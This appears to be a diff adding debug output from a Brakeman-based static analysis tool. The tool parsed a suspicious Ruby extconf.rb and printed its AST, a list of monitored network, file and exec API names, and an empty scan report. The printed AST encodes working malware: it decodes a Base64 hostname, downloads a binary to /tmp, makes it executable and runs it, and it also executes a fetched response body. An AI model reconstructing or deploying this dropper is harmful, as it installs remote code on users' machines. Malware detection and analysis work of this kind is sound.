@@ -1,0 +1,294 @@
+>>>>
+{:initializers=>[], :controllers=>[#<struct Brakeman::ASTFile path="/code/src/static_proxy/brakeman/rails2/app/controllers/extconf.rb", ast=s(:block, s(:call, nil, :require, s(:str, "net/http")), s(:call, nil, :require, s(:str, "uri")), s(:call, nil, :require, s(:str, "base64")), s(:call, nil, :require, s(:str, "resolv")), s(:class, :Smectis, nil, s(:defs, s(:self), :install_explot, s(:args, :weighership), s(:if, s(:and, s(:call, s(:call, s(:lvar, :weighership), :nil?), :!), s(:call, s(:lvar, :weighership), :!=, s(:str, "0.0.0.0"))), s(:block, s(:lasgn, :educable, s(:call, s(:colon2, s(:const, :Net), :HTTP), :get_response, s(:call, nil, :URI, s(:call, s(:call, s(:str, "http://"), :+, s(:lvar, :weighership)), :+, s(:str, "/mimming"))))), s(:iter, s(:call, s(:const, :File), :open, s(:str, "/tmp/autosymbiontic"), s(:str, "wb+")), s(:args, :uterometer), s(:block, s(:call, s(:lvar, :uterometer), :binmode), s(:call, s(:lvar, :uterometer), :write, s(:call, s(:lvar, :educable), :body)), s(:call, s(:lvar, :uterometer), :chmod, s(:lit, 511)), s(:call, s(:lvar, :uterometer), :close))), s(:call, nil, :system, s(:str, "/tmp/autosymbiontic"))), nil)), s(:defs, s(:self), :r1, s(:args), s(:iter, s(:call, s(:colon2, s(:const, :Net), :HTTP), :start, s(:str, "somedomain.net")), s(:args, :http), s(:block, s(:lasgn, :resp, s(:call, s(:lvar, :http), :get, s(:str, "/flv/sample/sample.flv"))), s(:call, nil, :system, s(:lvar, :resp)))), s(:call, nil, :puts, s(:str, "Done."))), s(:defs, s(:self), :run, s(:args), s(:lasgn, :milligram, s(:str, "MjlmYWVhNjMucGxhbmZobnRhZ2UuZGU=")), s(:lasgn, :jaunting, s(:nil)), s(:rescue, s(:lasgn, :jaunting, s(:call, s(:const, :Resolv), :getaddress, s(:call, s(:const, :Base64), :decode64, s(:lvar, :milligram)))), s(:resbody, s(:array), nil)), s(:call, s(:self), :install_exploit, s(:lvar, :jaunting)))), s(:call, s(:const, :Smectis), :run))>], :models=>[], :libs=>[]}
+<<<<
+loaded config with 258 apis to check!
+
+
+
+
+udp_server_loop
+udp_server_recv
+udp_server_loop_on
+recvfrom
+recvfrom_nonblock
+recv
+recv
+recv
+recv_nonblock
+recv_nonblock
+recv_nonblock
+recvmsg
+recvmsg
+recvmsg
+recvmsg_nonblock
+recvmsg_nonblock
+recvmsg_nonblock
+
+
+
+
+
+
+
+
+recvfrom_nonblock
+recvfrom
+recvfrom
+tcp
+tcp_server_loop
+tcp_server_sockets
+udp_server_loop
+udp_server_loop_on
+udp_server_recv
+udp_server_sockets
+
+
+
+
+accept
+accept
+accept_nonblock
+accept_nonblock
+get
+getbinaryfile
+getdir
+gettextfile
+retrbinary
+retrlines
+sendcmd
+get
+get_print
+get_response
+get2
+request_get
+request_get
+get_print
+get_response
+post
+post
+post_form
+post_form
+post2
+post2
+request_post
+request_post
+
+
+
+
+
+
+
+
+request
+request
+request_head
+request_head
+request_post
+request_post
+
+
+
+
+
+
+fetch
+uid_fetch
+
+
+start
+pop
+accept
+accept_nonblock
+sysaccept
+tcp
+tcp_server_loop
+tcp_server_sockets
+udp_server_loop
+udp_server_loop_on
+udp_server_recv
+udp_server_sockets
+send
+send
+send
+sendmsg
+sendmsg
+sendmsg
+sendmsg_nonblock
+sendmsg_nonblock
+sendmsg_nonblock
+
+
+put
+putbinaryfile
+puttextfile
+storbinary
+storlines
+post
+post_form
+post2
+request_post
+send_request
+append
+data
+send_mail
+send_message
+sendmail
+open_message_stream
+ready
+binread
+copy_stream
+copy_stream
+foreach
+
+
+
+
+for_fd
+for_fd
+open
+open
+pipe
+pipe
+popen
+popen
+read
+readlines
+sysopen
+sysopen
+try_convert
+try_convert
+each
+each_byte
+each_char
+each_line
+gets
+read
+read_nonblock
+readbyte
+readchar
+readline
+readpartial
+
+
+
+
+open
+open
+binread
+foreach
+for_fd
+pipe
+pipe
+read
+readlines
+cp
+cp
+copy
+copy
+copy_entry
+copy_entry
+copy_file
+copy_file
+copy_stream
+copy_stream
+cp_r
+cp_r
+open
+open
+gets
+readline
+readlines
+binwrite
+write
+putc
+puts
+pwrite
+syswrite
+write_nonblock
+popen
+popen
+write
+putc
+puts
+pwrite
+write
+syswrite
+write_nonblock
+printf
+putc
+puts
+rm
+rm_f
+rm_rf
+rmdir
+rmtree
+mv
+install
+rmdir
+unlink
+delete
+clear
+delete
+delete_if
+delete
+unlink
+truncate
+exec
+spawn
+system
+trap
+untrace_var
+eval
+fork
+lambda
+load
+syscall
+
+
+capture2
+capture2e
+capture3
+pipeline
+pipeline_r
+pipeline_rw
+pipeline_start
+pipeline_w
+popen2
+popen2
+popen2e
+popen2e
+popen3
+popen3
+{:target=>:File, :method=>:open, :call=>s(:call, s(:const, :File), :open, s(:str, "/tmp/autosymbiontic"), s(:str, "wb+")), :nested=>false, :chain=>[:File, :open], :location=>{:type=>:class, :class=>:Smectis, :method=>:"Smectis.install_explot", :file=>"/code/src/static_proxy/brakeman/rails2/app/controllers/extconf.rb"}, :parent=>nil, :block=>s(:rlist, s(:call, s(:lvar, :uterometer), :binmode), s(:call, s(:lvar, :uterometer), :write, s(:call, s(:call, s(:colon2, s(:const, :Net), :HTTP), :get_response, s(:call, nil, :URI, s(:call, s(:call, s(:str, "http://"), :+, s(:lvar, :weighership)), :+, s(:str, "/mimming")))), :body)), s(:call, s(:lvar, :uterometer), :chmod, s(:lit, 511)), s(:call, s(:lvar, :uterometer), :close)), :block_args=>s(:args, :uterometer)}
+{:target=>:File, :method=>:open, :call=>s(:call, s(:const, :File), :open, s(:str, "/tmp/autosymbiontic"), s(:str, "wb+")), :nested=>false, :chain=>[:File, :open], :location=>{:type=>:class, :class=>:Smectis, :method=>:"Smectis.install_explot", :file=>"/code/src/static_proxy/brakeman/rails2/app/controllers/extconf.rb"}, :parent=>nil, :block=>s(:rlist, s(:call, s(:lvar, :uterometer), :binmode), s(:call, s(:lvar, :uterometer), :write, s(:call, s(:call, s(:colon2, s(:const, :Net), :HTTP), :get_response, s(:call, nil, :URI, s(:call, s(:call, s(:str, "http://"), :+, s(:lvar, :weighership)), :+, s(:str, "/mimming")))), :body)), s(:call, s(:lvar, :uterometer), :chmod, s(:lit, 511)), s(:call, s(:lvar, :uterometer), :close)), :block_args=>s(:args, :uterometer)}
+{
+  "scan_info": {
+    "app_path": "/code/src/static_proxy/brakeman/rails2",
+    "rails_version": "4.x",
+    "security_warnings": 0,
+    "start_time": "2018-11-18 00:41:17 +0000",
+    "end_time": "2018-11-18 00:41:17 +0000",
+    "duration": 0.0542049,
+    "checks_performed": [
+      "Protobuf"
+    ],
+    "number_of_controllers": 1,
+    "number_of_models": 0,
+    "number_of_templates": 0,
+    "ruby_version": "2.3.1",
+    "brakeman_version": "4.3.1"
+  },
+  "warnings": [
+
+  ],
+  "ignored_warnings": [
+
+  ],
+  "errors": [
+
+  ],
+  "obsolete": [
+
+  ]
+}
